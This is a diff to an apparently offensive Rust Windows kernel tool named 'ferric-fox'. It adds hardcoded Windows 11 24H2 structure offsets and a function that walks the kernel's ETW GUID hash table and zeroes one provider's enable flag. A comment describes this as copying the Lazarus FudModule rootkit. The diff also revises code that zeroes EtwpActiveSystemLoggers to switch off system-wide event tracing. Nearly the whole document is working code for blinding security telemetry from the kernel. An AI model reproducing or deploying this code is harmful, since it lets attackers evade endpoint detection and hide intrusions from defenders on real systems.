@@ -199,6 +199,7 @@ pub fn get_etw_dispatch_table<'a>() -> Result<BTreeMap<&'a str, *const c_void>, 
     Ok(dispatch_table)
 }
 
+
 /// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_REG_ENTRY
 #[repr(C)]
 #[derive(Copy, Clone, Debug)]
@@ -217,6 +218,14 @@ struct GuidEntry {
     unused_1: ListEntry,
     unused_2: i64,
     guid: GUID,
+    unused_3: [u8; 0x28],
+    provider_enable_info: TraceEnableInfo,
+}
+
+#[repr(C)]
+#[derive(Debug, Copy, Clone)]
+struct TraceEnableInfo {
+    is_enabled: u32,
 }
 
 #[repr(C)]
@@ -275,26 +284,91 @@ pub fn clear_system_logger_bitmask() {
     } 
     
     // Calculate the offset in memory to the bitmask so we can disable it.
-    let logger_offset = size_of::<EtwSiloDriverState>();
-
-    // SAFETY: Null pointer checked above
     let address_of_silo_driver_state_struct = unsafe { *address } as usize;
-    let logger_addr = address_of_silo_driver_state_struct + logger_offset - size_of::<u32>();
+    let logger_addr = address_of_silo_driver_state_struct + 0x1098;
     let addr = logger_addr as *mut u32;
     
     // SAFETY: Pointer is valid based off of calculations
     unsafe { core::ptr::write(addr, 0) };
 
     println!("[ferric-fox] [+] Successfully patched EtwpActiveSystemLoggers to 0");
+}
 
+/// Disables a single GUID as how the Lazarus rootkit works
+/// https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/
+pub fn disable_single_guid() -> Result<(), ()> {
+    let address = resolve_relative_symbol_offset("EtwSendTraceBuffer", 78)
+        .expect("[ferric-fox] [-] Unable to resolve function EtwSendTraceBuffer")
+        as *const *const EtwSiloDriverState;
+
+    if address.is_null() {
+        println!("[ferric-fox] [-] Pointer to EtwSiloDriverState is null");
+        return Err(());
+    }
+
+    // SAFETY: Null pointer checked above
+    if unsafe { *address }.is_null() {
+        println!("[ferric-fox] [-] Address for EtwSiloDriverState is null");
+        return Err(());
+    }
+
+    // SAFETY: Null pointer checked above
+    let first_hash_address = &(unsafe { &**address }.guid_hash_table);
     
+    for i in 0..64 {
+        let hash_bucket_entry = unsafe { first_hash_address.as_ptr().offset(i) } as *const *mut GuidEntry;
+        if hash_bucket_entry.is_null() {
+            println!("[ferric-fox] [i] Found null pointer whilst traversing list at index: {i}");
+            continue;
+        }
+
+        if unsafe {*hash_bucket_entry}.is_null() {
+            println!("[ferric-fox] [i] Found null INNER pointer whilst traversing list at index: {i}");
+            continue;
+        }
+
+        let guid_entry = unsafe { &mut **hash_bucket_entry };
+
+        if guid_entry.provider_enable_info.is_enabled != 0
+            && guid_entry.guid.to_string() == "EFB251E4-D454-4A02-B126-7FBB9D3991C3"
+        {
+            println!(
+                "Altering Lazarus abused GUID entry with non-zero value value: {:08b}, GUID: {}",
+                guid_entry.provider_enable_info.is_enabled,
+                guid_entry.guid.to_string()
+            );
+
+            unsafe {
+                core::ptr::write(&mut guid_entry.provider_enable_info.is_enabled as *const u32 as *mut u32, 0u32);
+            }
+
+            println!(
+                "Finished altering Lazarus abused GUID entry with non-zero value value: {:08b}, GUID: {}",
+                guid_entry.provider_enable_info.is_enabled,
+                guid_entry.guid.to_string()
+            );
+        }
+    }
+
+    Ok(())
 }
 
 /// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_SILODRIVERSTATE
 #[repr(C)]
 struct EtwSiloDriverState {
-    unused: [u8; 0x1087],
+    unused_1: [u8; 0x1d0],
+    guid_hash_table: [EtwHashBucket; 64],
+    unused_2: [u8; 0xB8],
     settings: EtwSystemLoggerSettings,
+    unused_3: [u8; 0x38],
+}
+
+/// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_HASH_BUCKET
+#[repr(C)]
+#[derive(Debug)]
+struct EtwHashBucket {
+    list_head: ListEntry,
+    unused: [u8; 0x28], // remaining space we dont need, but we do need them filling out
 }
 
 /// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_SYSTEM_LOGGER_SETTINGS
@@ -303,4 +377,5 @@ struct EtwSiloDriverState {
 struct EtwSystemLoggerSettings {
     unused: [u8; 0xf],
     active_system_loggers: u32,
+    unused_2: [u8; 0x160],
 }
